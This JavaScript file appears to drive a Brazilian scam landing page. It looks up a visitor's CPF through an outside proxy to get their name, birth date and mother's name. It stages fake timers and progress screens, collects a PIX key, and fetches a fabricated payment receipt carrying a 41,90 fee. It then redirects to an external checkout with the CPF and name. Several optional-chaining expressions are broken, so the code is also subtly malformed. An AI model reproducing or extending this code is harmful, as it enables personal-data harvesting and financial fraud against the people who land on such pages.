// ============================================================
// function.js — versão robusta (CPF + Comprovante)
// ============================================================

// ------------------------------------------------------------
// Helpers globais
// ------------------------------------------------------------
const _isHttp = (s) => typeof s === 'string' && /^https?:\/\//i.test(s);
const _isData = (s) => typeof s === 'string' && /^data:image\/[a-zA-Z+.-]+;base64,/i.test(s);

// Cache do comprovante por chave (cpf|name|data|tax)
let _comprovanteCache = {
    key: null,
    src: null
};

// Log básico de erros não tratados (ajuda a depurar em produção)
window.addEventListener('error', (e) => {
    console.error('JS Error:', e.message, 'em', e.filename + ':' + e.lineno);
});
window.addEventListener('unhandledrejection', (e) => {
    console.error('Promise rejeitada sem catch:', e.reason);
});

// ------------------------------------------------------------
// Fetch com fallback para proxy (CORS) — tolerante a text/plain
// ------------------------------------------------------------
async function fetchJsonWithCorsFallback(url) {
    try {
        const r = await fetch(url, {
            headers: {
                'Accept': 'application/json, text/plain, */*'
            }
        });
        if (!r.ok) throw new Error(`HTTP ${r.status}`);
        const ct = r.headers.get('content-type') || '';
        return ct.includes('application/json') ? await r.json() : JSON.parse(await r.text());
    } catch (err) {
        console.warn('[CORS/Fetch] tentando via proxy:', err.message);
        const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(url);
        const r2 = await fetch(proxyUrl, {
            headers: {
                'Accept': 'application/json, text/plain, */*'
            }
        });
        if (!r2.ok) throw new Error(`Proxy HTTP ${r2.status}`);
        const txt = await r2.text();
        try {
            return JSON.parse(txt);
        } catch (e2) {
            console.error('[Proxy] Falha ao parsear JSON:', e2, 'RAW=', txt.slice(0, 200));
            throw err;
        }
    }
}

// ------------------------------------------------------------
// Extrai a imagem do JSON (aceita http(s) e data URI)
// ------------------------------------------------------------
function extractImageSrcFromJson(json) {
    if (!json || typeof json !== 'object') return null;

    const paths = [
        ['data', 'image'],
        ['image'],
        ['url'],
        ['link'],
        ['data', 'url'],
        ['data', 'link'],
    ];

    for (const p of paths) {
        let v = json;
        for (const k of p) v = v ? .[k];
        if (typeof v === 'string') {
            const s = v.trim();
            if (_isHttp(s) || _isData(s)) return s;
        }
    }

    // fallback: procura http(s)
    const str = JSON.stringify(json);
    const mHttp = str.match(/https?:\/\/[^"']+\.(?:png|jpe?g|webp|gif)/i);
    if (mHttp) return mHttp[0];

    // fallback: procura data URI
    const mData = str.match(/data:image\/[a-zA-Z+.-]+;base64,[A-Za-z0-9+/=]+/);
    return mData ? mData[0] : null;
}

// ------------------------------------------------------------
// Gera/obtém a imagem do comprovante (com cache por chave)
// ------------------------------------------------------------
async function prefetchComprovante() {
    const cpf = (localStorage.getItem('cpf') || '').replace(/\D/g, '');
    const name = localStorage.getItem('name') || '';
    const dataHoje = new Date().toLocaleDateString('pt-BR'); // dd/mm/aaaa
    const tax = '41,90';

    const cacheKey = `${cpf}|${name}|${dataHoje}|${tax}`;
    if (_comprovanteCache.key === cacheKey && _comprovanteCache.src) {
        return _comprovanteCache.src;
    }

    const qs = new URLSearchParams({
        cpf,
        name,
        data: dataHoje,
        tax: tax
    });
    const endpoint = `https://webhook.bestbot.su/webhook/api?${qs.toString()}`;

    console.log('[Comprovante] webhook:', endpoint);

    const json = await fetchJsonWithCorsFallback(endpoint);
    console.log('[Comprovante] resposta JSON:', json);

    const src = extractImageSrcFromJson(json);
    if (!src) throw new Error('JSON sem URL/BASE64 de imagem');

    _comprovanteCache = {
        key: cacheKey,
        src
    };
    return src;
}

// ------------------------------------------------------------
// Mostra a imagem no Step 14 (cria elementos se não existirem)
// ------------------------------------------------------------
async function showComprovante() {
    try {
        // 1) contêiner preferencial (dentro do step14)
        const step14 = document.getElementById('step14') || document.body;
        const container =
            step14.querySelector('.relative') ||
            step14.querySelector('[data-comprovante-container]') ||
            step14;

        // 2) garante skeleton
        let skeleton = document.getElementById('comprovanteSkeleton');
        if (!skeleton) {
            skeleton = document.createElement('div');
            skeleton.id = 'comprovanteSkeleton';
            skeleton.className = 'w-full h-64 bg-gray-200 animate-pulse rounded-xl';
            container.appendChild(skeleton);
        }
        skeleton.classList.remove('hidden');

        // 3) garante img
        let img = document.getElementById('comprovanteImg');
        if (!img) {
            img = document.createElement('img');
            img.id = 'comprovanteImg';
            img.className = 'hidden w-full h-auto rounded-lg shadow-sm';
            img.alt = 'Gerando comprovante...';
            container.appendChild(img);
        }
        img.classList.add('hidden');
        img.removeAttribute('src');

        // 4) busca/gera imagem
        const src = await prefetchComprovante();

        // 5) pré-carrega
        await new Promise((resolve, reject) => {
            const probe = new Image();
            probe.decoding = 'async';
            probe.onload = resolve;
            probe.onerror = reject;
            probe.src = src;
        });

        // 6) define src (sem cache-buster em data:)
        img.src = _isHttp(src) ? src + (src.includes('?') ? '&' : '?') + 't=' + Date.now() : src;
        img.alt = 'Comprovante gerado';
        img.loading = 'eager';
        img.decoding = 'sync';

        // 7) mostra
        img.classList.remove('hidden');
        skeleton.classList.add('hidden');
        console.log('[Comprovante] imagem exibida');
    } catch (e) {
        console.error('[Comprovante] falhou:', e);
        const img = document.getElementById('comprovanteImg');
        const skeleton = document.getElementById('comprovanteSkeleton');
        if (img) {
            img.removeAttribute('src');
            img.alt = 'Não foi possível carregar o comprovante no momento.';
            img.classList.remove('hidden');
        }
        if (skeleton) skeleton.classList.add('hidden');
    }
}

// ============================================================
// Fluxo principal (form + timer)
// ============================================================
document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('form');
    const cpfInput = document.getElementById('cpf');
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');

    // Formata CPF
    cpfInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 11) value = value.slice(0, 11);
        if (value.length > 9) {
            value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
        } else if (value.length > 6) {
            value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, '$1.$2.$3');
        } else if (value.length > 3) {
            value = value.replace(/^(\d{3})(\d{3}).*/, '$1.$2');
        }
        e.target.value = value;
    });

    // Submit (agora usando fetchJsonWithCorsFallback)
    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        const cpf = cpfInput.value.replace(/\D/g, '');
        if (cpf.length !== 11) {
            alert('Por favor, digite um CPF válido');
            return;
        }

        const submitButton = form.querySelector('button[type="submit"]');
        const originalButtonText = submitButton.innerHTML;
        submitButton.innerHTML = '<div class="loader" style="display:inline-block;"></div> Consultando...';
        submitButton.disabled = true;

        try {
            const url = `https://proxy-g.vercel.app/api/proxy?cpf=${encodeURIComponent(cpf)}`;
            const data = await fetchJsonWithCorsFallback(url);

            if (!data || !data.dadosBasicos) {
                console.error('[CPF] JSON inesperado:', data);
                alert('CPF não encontrado na base de dados.');
                return;
            }

            const userData = data;

            localStorage.setItem('dadosBasicos', JSON.stringify(userData));
            localStorage.setItem('cpf', String(userData.dadosBasicos.cpf || cpf).replace(/\D/g, ''));
            localStorage.setItem('name', userData.dadosBasicos.nome || '');
            localStorage.setItem('nasc', userData.dadosBasicos.nascimento || '');
            localStorage.setItem('name_m', userData.dadosBasicos.mae || '');

            step1.classList.add('hidden');
            step2.classList.remove('hidden');

            const nameValue = localStorage.getItem('name') || '';
            document.getElementById('nameUser').textContent = nameValue;
            document.getElementById('nameUser2').textContent = nameValue;

            const cpfValue = localStorage.getItem('cpf') || cpf;
            document.getElementById('cpfUser').textContent = cpfValue;

            handleTimer();
        } catch (error) {
            alert('Erro ao consultar o CPF. Verifique o console do navegador para detalhes.');
            console.error('[CPF] Falha na consulta:', error);
        } finally {
            submitButton.innerHTML = originalButtonText;
            submitButton.disabled = false;
        }
    });

    function handleTimer() {
        const nameValue = localStorage.getItem('name');
        const nameHeaderEl = document.getElementById('nameHeader');
        if (nameHeaderEl) nameHeaderEl.textContent = nameValue || '';

        let totalSeconds = 100;
        const timerElement = document.getElementById('timer');
        const buttonElement = document.getElementById('buttonNext');

        const countdown = setInterval(() => {
            const minutes = Math.floor(totalSeconds / 60);
            const seconds = totalSeconds % 60;
            if (timerElement) {
                timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            }
            totalSeconds--;
            if (totalSeconds < 0) {
                clearInterval(countdown);
                if (timerElement) timerElement.textContent = '00:00';
                buttonElement ? .classList ? .remove('hidden');
            }
        }, 1000);
    }
});

// ============================================================
// Controles de vídeo
// ============================================================
function playVideo1() {
    const video = document.getElementById('video1');
    const overlay = document.getElementById('overlay');
    video ? .play();
    overlay ? .classList ? .add('hidden');
}

function playVideo2() {
    const video = document.getElementById('video2');
    const overlay = document.getElementById('overlay2');
    video ? .play();
    overlay ? .classList ? .add('hidden');
}

// ============================================================
// Steps
// ============================================================
function step2to3() {
    const step2 = document.getElementById('step2');
    const step3 = document.getElementById('step3');
    step2.classList.add('hidden');
    step3.classList.remove('hidden');

    const v1 = document.getElementById('video1');
    if (v1) {
        try {
            v1.pause();
            v1.muted = true;
            v1.currentTime = 0;
        } catch (_) {}
    }

    const nameValue = localStorage.getItem('name') || '';
    document.getElementById('nameUser2').textContent = nameValue;

    const cpfValue = localStorage.getItem('cpf') || '';
    document.getElementById('cpfUser').textContent = cpfValue;

    let tempoRestante = 45 * 60;

    function timer2() {
        const minutos = Math.floor(tempoRestante / 60);
        const segundos = tempoRestante % 60;
        const el = document.getElementById('timer2');
        if (el) el.textContent = `${String(minutos).padStart(2, '0')}:${String(segundos).padStart(2, '0')}`;
        if (tempoRestante > 0) tempoRestante--;
        else {
            clearInterval(intervalo);
            if (el) el.textContent = '00:00:00';
        }
    }
    const intervalo = setInterval(timer2, 1000);
}

function step3to4() {
    const step3 = document.getElementById('step3');
    const step4 = document.getElementById('step4');
    step3.classList.add('hidden');
    step4.classList.remove('hidden');
    setTimeout(() => {
        document.getElementById('button4') ? .classList ? .remove('hidden');
    }, 38000);
}

function step4to5() {
    const step4 = document.getElementById('step4');
    const step5 = document.getElementById('step5');
    step4.classList.add('hidden');
    step5.classList.remove('hidden');

    const nameValue = localStorage.getItem('name') || '';
    document.getElementById('nameUser5').textContent = nameValue;

    const cpfValue = localStorage.getItem('cpf') || '';
    document.getElementById('cpfUser5').textContent = cpfValue;

    const nameM = localStorage.getItem('name_m') || '';
    document.getElementById('nameM5').textContent = nameM;

    const buttons = document.querySelectorAll('.option-btn');
    buttons.forEach((btn) => {
        btn.addEventListener('click', () => {
            if (btn.classList.contains('border-blue-500')) {
                btn.classList.remove('border-blue-500', 'bg-blue-100');
                btn.classList.add('border-gray-200');
            } else {
                buttons.forEach((b) => {
                    b.classList.remove('border-blue-500', 'bg-blue-100');
                    b.classList.add('border-gray-200');
                });
                btn.classList.remove('border-gray-200');
                btn.classList.add('border-blue-500', 'bg-blue-100');
            }
        });
    });
}

function step5to6() {
    const step5 = document.getElementById('step5');
    const step6 = document.getElementById('step6');
    step5.classList.add('hidden');
    step6.classList.remove('hidden');

    progressAudio1();

    function progressAudio1() {
        const audio = document.getElementById('audio1');
        audio ? .play();
        const progressBarAudio1 = document.getElementById('progress-bar-audio1');
        let progress = 0;
        const duration = 8000,
            intervalTime = 60,
            increment = 100 / (duration / intervalTime);
        const interval = setInterval(() => {
            progress += increment;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
            }
            if (progressBarAudio1) progressBarAudio1.style.width = `${progress}%`;
        }, intervalTime);

        const actualTime = document.getElementById('actualTime');
        let secondsBy = 0,
            fullduration = 8;
        const timeInterval = setInterval(() => {
            if (secondsBy >= fullduration) {
                clearInterval(timeInterval);
                return;
            }
            secondsBy++;
            const minutesTime = Math.floor(secondsBy / 60);
            const secondsTime = secondsBy % 60;
            if (actualTime) actualTime.textContent = `${String(minutesTime).padStart(1,'0')}:${String(secondsTime).padStart(2,'0')}`;
        }, 1000);
    }

    setTimeout(() => {
        step6to7();
    }, 10000);

    function step6to7() {
        const step6 = document.getElementById('step6');
        const step7 = document.getElementById('step7');
        step6.classList.add('hidden');
        step7.classList.remove('hidden');

        const progressBar = document.getElementById('progress-bar');
        const percentText = document.getElementById('percent');

        (function progress() {
            let progress = 0;
            const duration = 6000,
                intervalTime = 60,
                increment = 100 / (duration / intervalTime);
            const interval = setInterval(() => {
                progress += increment;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(interval);
                }
                if (progressBar) progressBar.style.width = `${progress}%`;
                if (percentText) percentText.textContent = `${Math.floor(progress)}%`;
            }, intervalTime);
        })();

        setTimeout(() => {
            step7to8();
        }, 7000);

        function step7to8() {
            const step7 = document.getElementById('step7');
            const step8 = document.getElementById('step8');
            step7.classList.add('hidden');
            step8.classList.remove('hidden');

            setTimeout(() => {
                step8to9();
            }, 5000);

            function step8to9() {
                const step8 = document.getElementById('step8');
                const step9 = document.getElementById('step9');
                step8.classList.add('hidden');
                step9.classList.remove('hidden');

                const nameValue = localStorage.getItem('name') || '';
                document.getElementById('nameUser9').textContent = nameValue;

                const cpfValue = localStorage.getItem('cpf') || '';
                document.getElementById('cpfUser9').textContent = cpfValue;

                const buttons = document.querySelectorAll('.pix-btn');
                const input = document.getElementById('pixKey');

                buttons.forEach((btn) => {
                    btn.addEventListener('click', () => {
                        if (input) {
                            input.placeholder = btn.dataset.placeholder;
                            input.type = btn.dataset.type;
                        }
                        buttons.forEach((b) => b.classList.remove('border-green-500', 'bg-green-50', 'text-green-800'));
                        btn.classList.add('border-green-500', 'bg-green-50', 'text-green-800');
                    });
                });
            }
        }
    }
}

function step9to10() {
    const step9 = document.getElementById('step9');
    const step10 = document.getElementById('step10');
    step9.classList.add('hidden');
    step10.classList.remove('hidden');

    const buttons = document.querySelectorAll('.pix-btn');
    const input = document.getElementById('pixKey');

    buttons.forEach((btn) => {
        btn.addEventListener('click', () => {
            if (input) {
                input.placeholder = btn.dataset.placeholder;
                input.type = btn.dataset.type;
            }
            buttons.forEach((b) => b.classList.remove('border-green-500', 'bg-green-50', 'text-green-800'));
            btn.classList.add('border-green-500', 'bg-green-50', 'text-green-800');
        });
    });

    const pixValue = input ? .value || '';
    const tipoSelecionado = document.querySelector('.border-green-500');
    const tipo = tipoSelecionado ? .textContent ? .trim() || 'Desconhecido';

    if (pixValue === '') {
        alert('Por favor, insira uma chave PIX.');
        return;
    }

    localStorage.setItem('chavePix', pixValue);
    localStorage.setItem('tipoPIX', tipo);

    const nameValue = localStorage.getItem('name') || '';
    document.getElementById('nameUser10').textContent = nameValue;

    const cpfValue = localStorage.getItem('cpf') || '';
    document.getElementById('cpfUser10').textContent = cpfValue;

    const chavePix = localStorage.getItem('chavePix') || '';
    document.getElementById('chavePix10').textContent = chavePix;
}

function step10to11() {
    const step10 = document.getElementById('step10');
    const step11 = document.getElementById('step11');
    step10.classList.add('hidden');
    step11.classList.remove('hidden');

    const nameValue = localStorage.getItem('name') || '';
    document.getElementById('nameUser11').textContent = nameValue;

    const chavePix = localStorage.getItem('chavePix') || '';
    document.getElementById('chavePix11').textContent = chavePix;
}

function step10to9() {
    const step10 = document.getElementById('step10');
    const step9 = document.getElementById('step9');
    step10.classList.add('hidden');
    step9.classList.remove('hidden');
}

function step11to12() {
    const step11 = document.getElementById('step11');
    const step12 = document.getElementById('step12');
    step11.classList.add('hidden');
    step12.classList.remove('hidden');

    // pré-carrega comprovante durante o áudio
    prefetchComprovante().catch((err) => {
        console.warn('[Comprovante] prefetch falhou (tentará no step14):', err);
    });

    progressAudio2();

    function progressAudio2() {
        const audio = document.getElementById('audio2');
        audio ? .play();
        const progressBarAudio2 = document.getElementById('progress-bar-audio2');
        let progress = 0;
        const duration = 19000,
            intervalTime = 60,
            increment = 100 / (duration / intervalTime);
        const interval = setInterval(() => {
            progress += increment;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
            }
            if (progressBarAudio2) progressBarAudio2.style.width = `${progress}%`;
        }, intervalTime);

        const actualTime2 = document.getElementById('actualTime2');
        let secondsBy2 = 0,
            fullduration2 = 19;
        const timeInterval2 = setInterval(() => {
            if (secondsBy2 >= fullduration2) {
                clearInterval(timeInterval2);
                return;
            }
            secondsBy2++;
            const minutesTime2 = Math.floor(secondsBy2 / 60);
            const secondsTime2 = secondsBy2 % 60;
            if (actualTime2) actualTime2.textContent = `${String(minutesTime2).padStart(1,'0')}:${String(secondsTime2).padStart(2,'0')}`;
        }, 1000);
    }

    setTimeout(() => {
        step12to13();
    }, 20000);
}

function step12to13() {
    const step12 = document.getElementById('step12');
    const step13 = document.getElementById('step13');
    step12.classList.add('hidden');
    step13.classList.remove('hidden');

    (function progress2() {
        const progressBar2 = document.getElementById('progress-bar2');
        const percentText = document.getElementById('percent2');
        let progress2 = 0;
        const duration = 6000,
            intervalTime = 60,
            increment = 100 / (duration / intervalTime);
        const interval = setInterval(() => {
            progress2 += increment;
            if (progress2 >= 100) {
                progress2 = 100;
                clearInterval(interval);
            }
            if (progressBar2) progressBar2.style.width = `${progress2}%`;
            if (percentText) percentText.textContent = `${Math.floor(progress2)}%`;
        }, intervalTime);
    })();

    setTimeout(() => {
        step13to14();
    }, 7000);
}

// Step 13 -> 14
function step13to14() {
    const step13 = document.getElementById('step13');
    const step14 = document.getElementById('step14');
    step13.classList.add('hidden');
    step14.classList.remove('hidden');

    const nameValue = localStorage.getItem('name') || '';
    document.getElementById('nameUser14').textContent = nameValue;

    const cpfValue = localStorage.getItem('cpf') || '';
    document.getElementById('cpfUser14').textContent = cpfValue;

    const chavePix = localStorage.getItem('chavePix') || '';
    document.getElementById('chavePix14').textContent = chavePix;

    const tipoPix = localStorage.getItem('tipoPIX') || '';
    document.getElementById('tipoPix14').textContent = tipoPix;

    // exibe a imagem do comprovante (chama 2x como failsafe)
    showComprovante();
    setTimeout(showComprovante, 1000);
}

function step14to15() {
    const step14 = document.getElementById('step14');
    const step15 = document.getElementById('step15');
    step14.classList.add('hidden');
    step15.classList.remove('hidden');

    progressAudio3();

    function progressAudio3() {
        const audio = document.getElementById('audio3');
        audio ? .play();
        const progressBarAudio3 = document.getElementById('progress-bar-audio3');
        let progress = 0;
        const duration = 28000,
            intervalTime = 60,
            increment = 100 / (duration / intervalTime);
        const interval = setInterval(() => {
            progress += increment;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
            }
            if (progressBarAudio3) progressBarAudio3.style.width = `${progress}%`;
        }, intervalTime);

        const actualTime3 = document.getElementById('actualTime3');
        let secondsBy3 = 0,
            fullduration3 = 28;
        const timeInterval2 = setInterval(() => {
            if (secondsBy3 >= fullduration3) {
                clearInterval(timeInterval2);
                return;
            }
            secondsBy3++;
            const minutesTime3 = Math.floor(secondsBy3 / 60);
            const secondsTime3 = secondsBy3 % 60;
            if (actualTime3) actualTime3.textContent = `${String(minutesTime3).padStart(1,'0')}:${String(secondsTime3).padStart(2,'0')}`;
        }, 1000);
    }

    setTimeout(() => {
        step15to16();
    }, 30000);
}

function step15to16() {
    const step15 = document.getElementById('step15');
    const step16 = document.getElementById('step16');
    step15.classList.add('hidden');
    step16.classList.remove('hidden');
}

// ============================================================
// URL final
// ============================================================
function redirect() {
    const cpf = localStorage.getItem('cpf');
    const name = localStorage.getItem('name');
    const cpfEncoded = encodeURIComponent(cpf || '');
    const nameEncoded = encodeURIComponent(name || '');
    const url = `https://pay.checkoutonline.click/JqoR32bY9RA3Vj5?document=${cpfEncoded}&name=${nameEncoded}`;
    window.location.href = url;
}